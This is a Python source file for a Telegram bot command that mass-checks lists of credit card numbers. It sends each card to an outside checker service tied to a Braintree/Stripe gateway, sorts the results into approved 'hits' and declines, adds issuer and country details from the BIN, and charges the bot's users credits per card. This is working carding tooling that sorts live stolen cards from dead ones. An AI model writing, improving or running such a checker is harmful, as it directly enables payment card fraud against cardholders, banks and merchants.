import json
import time
import threading
import asyncio
import httpx
import re
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *
from TOOLS.getbin import *

async def forward_resp(fullcc, gateway, response):
    print(f"[FORWARD] {gateway} - {fullcc}: {response}")

async def refundcredit(user_id):
    print(f"[REFUND] Refund credit for user {user_id}")

async def result_logs(fullcc, gateway, result):
    print(f"[LOG] {gateway} - {fullcc}: {result}")

def map_braintree_response(api_data, user_id, fullcc):
    hits = "NO"
    status = "DECLINED❌"
    response = "Unknown Error ❌"
    try:
        response_status = api_data.get('status', '').lower()
        response_text = api_data.get('response', '') or api_data.get('message', '')
        is_approved = api_data.get('is_approved', False)

        if is_approved:
            status = "APPROVED✅"
            response = "Thank you for your donation "
            hits = "YES"
            asyncio.create_task(forward_resp(fullcc, "STRIPE AUTH", response))
        else:
            if "Status code cvv: Gateway Rejected: cvv" in response_text:
                status = "DECLINED❌"
                response = "Gateway Rejected: cvv ❌"
            elif "Declined - Call Issuer" in response_text:
                status = "DECLINED❌"
                response = "Declined - Call Issuer ❌"
            elif "2004: Expired Card (54 : EXPIRED CARD)" in response_text:
                status = "DECLINED❌"
                response = "2004: Expired Card ❌"
            elif "81724: Duplicate card exists in the vault." in response_text:
                status = "APPROVED✅"
                response = "Approved ✅"
                hits = "YES"
                asyncio.create_task(forward_resp(fullcc, "STRIPE AUTH", response))
            elif "Cannot Authorize at this time" in response_text:
                status = "DECLINED❌"
                response = "2106: Cannot Authorize at this time (Policy) ❌"
            elif "Status code 2014: Processor Declined - Fraud Suspected (51 : DECLINED)" in response_text:
                status = "DECLINED❌"
                response = "2014: Processor Declined - Fraud Suspected ❌"
            elif "risk_threshold: Gateway Rejected: risk_threshold" in response_text:
                status = "DECLINED❌"
                response = "Gateway Rejected: risk_threshold. ❌"
            elif ("We're sorry, but the payment validation failed. Declined - Call Issuer" in response_text or
                  "Payment failed: Declined - Call Issuer" in response_text):
                status = "DECLINED❌"
                response = "2044: Declined - Call Issuer ❌"
            elif "ProxyError" in response_text:
                status = "DECLINED❌"
                response = "Proxy Connection Refused ❌"
                asyncio.create_task(refundcredit(user_id))
            else:
                if response_text:
                    response = response_text
                    if not response.endswith('❌'):
                        response += ' ❌'
                else:
                    response = "Declined ❌"
            hits = "NO"
        return {
            "status": status,
            "response": response,
            "hits": hits,
            "fullz": fullcc,
        }
    except Exception as e:
        return {
            "status": "DECLINED❌",
            "response": f"Error: {str(e)} ❌",
            "hits": "NO",
            "fullz": fullcc,
        }

async def mchkfunc(fullcc, user_id):
    retries = 3
    for attempt in range(retries):
        try:
            session = httpx.AsyncClient(timeout=30, follow_redirects=True)
            resp = await session.get("https://b3-checker-production.up.railway.app/check", params={"card": fullcc})
            api_data = resp.json()
            mapped = map_braintree_response(api_data, user_id, fullcc)
            await session.aclose()
            return f"Card↯ <code>{fullcc}</code>\n<b>Status - {mapped['status']}</b>\n<b>Result -⤿ {mapped['response']} ⤾</b>\n\n"
        except Exception as e:
            import traceback
            await error_log(traceback.format_exc())
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
                continue
            else:
                return f"<code>{fullcc}</code>\n<b>Result - DECLINED ❌</b>\n"

@Client.on_message(filters.command("mchk", [".", "/"]))
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()

def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(braintree_mass_auth_cmd(Client, message))
    loop.close()

async def braintree_mass_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]
        resp = f"""
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  Stripe Auth

- 𝐂𝐂 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(ccs)}
- 𝐂𝐡𝐞𝐜𝐤𝐞𝗱 - Checking CC For {first_name}

- 𝐒𝐭𝐚𝐭𝐮𝐬 - Processing...⌛️
"""
        nov = await message.reply_text(resp, message.id)

        text_header = f"""
<b>↯ Stripe Auth [/mchk]

Number Of CC Check : [{len(ccs)}]
</b>\n
"""

        text = text_header
        amt = 0
        start = time.perf_counter()
        config = json.loads(open("FILES/config.json", "r", encoding="utf-8").read())
        worker_num = int(config["THREADS"])
        tasks = [mchkfunc(cc, user_id) for cc in ccs]

        # Process batches sequentially with concurrency limit worker_num
        for i in range(0, len(tasks), worker_num):
            batch = tasks[i:i + worker_num]
            batch_results = await asyncio.gather(*batch)
            for result_text in batch_results:
                fullcc = ccs[amt]
                amt += 1
                getbin = await get_bin_details(fullcc)

                brand = getbin[0] if len(getbin) > 0 else "Unknown"
                type_ = getbin[1] if len(getbin) > 1 else "Unknown"
                level = getbin[2] if len(getbin) > 2 else "Unknown"
                bank = getbin[3] if len(getbin) > 3 else "Unknown"
                country = getbin[4] if len(getbin) > 4 else "Unknown"
                flag = getbin[5] if len(getbin) > 5 else ""
                currency = getbin[6] if len(getbin) > 6 else "Unknown"

                proxy_status = "Live ✨"
                gateway = "Stripe Auth"
                bin6 = fullcc[:6]

                status_match = re.search(r"Status - ([^\n<]+)", result_text)
                response_match = re.search(r"Result -⤿ ([^\n<]+)", result_text)
                status_text = status_match.group(1) if status_match else "UNKNOWN"
                response_text = response_match.group(1) if response_match else "UNKNOWN"

                finalresp = f"""
{status_text}
━━━━━━━━━━━━━
[㊕] 𝗖𝗖 - <code>{fullcc}</code>
[㊕] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response_text}
[㊕] 𝗚𝗮𝘁𝗲  - {gateway}
━━━━━━━━━━━━━
[㊕] B𝗶𝗻 : {bin6}
[㊕] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[㊕] 𝗜𝘀𝘀𝘂𝗿 : {bank}
[㊕] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
"""
                text += finalresp
            try:
                await Client.edit_message_text(message.chat.id, nov.id, text)
            except Exception as e:
                print(f"[ERROR] Editing message: {e}")
            await asyncio.sleep(1)  # Slow down message edits

        # Append summary footer once
        text += f"""
━━━━━━━━━━━━━
[㊕] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[㊕] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={user_id}'> {first_name}</a> [ {role} ]
[㊕] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝
"""
        await Client.edit_message_text(message.chat.id, nov.id, text)
        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
